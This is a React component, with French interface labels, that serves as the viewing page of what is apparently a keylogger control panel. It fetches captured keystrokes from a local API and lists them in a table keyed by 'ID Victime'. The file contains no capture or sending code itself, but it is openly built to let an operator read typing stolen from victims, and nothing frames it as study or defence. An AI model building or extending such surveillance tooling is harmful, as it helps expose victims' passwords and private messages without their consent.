import React, { useState, useEffect } from 'react';
import { Typography, Box, Paper, CircularProgress } from '@mui/material';
import { DataGrid } from '@mui/x-data-grid';
import { logService } from '../services/api';

const KeystrokesPage = () => {
    const [keystrokes, setKeystrokes] = useState([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const fetchAllKeystrokes = async () => {
            try {
                const response = await fetch('http://localhost:5000/api/keystrokes');
                const data = await response.json();
                setKeystrokes(data);
            } catch (error) {
                console.error('Error fetching keystrokes:', error);
            } finally {
                setLoading(false);
            }
        };
        fetchAllKeystrokes();
    }, []);

    const columns = [
        { field: 'victim_id', headerName: 'ID Victime', width: 150, renderCell: (params) => params.value.substring(0, 8) + '...' },
        { field: 'timestamp', headerName: 'Timestamp', width: 180 },
        { field: 'keystrokes', headerName: 'Frappes', width: 400, flex: 1, renderCell: (params) => <Typography sx={{ fontFamily: 'monospace', whiteSpace: 'pre-wrap' }}>{params.value}</Typography> },
    ];

    return (
        <Box>
            <Typography variant="h4" component="h1" gutterBottom>Toutes les Frappes</Typography>
            <Paper sx={{ p: 2, height: '75vh' }}>
                {loading ? (
                    <Box display="flex" justifyContent="center" alignItems="center" height="60vh">
                        <CircularProgress />
                    </Box>
                ) : (
                    <DataGrid rows={keystrokes} columns={columns} getRowId={(row) => row.id} />
                )}
            </Paper>
        </Box>
    );
};

export default KeystrokesPage;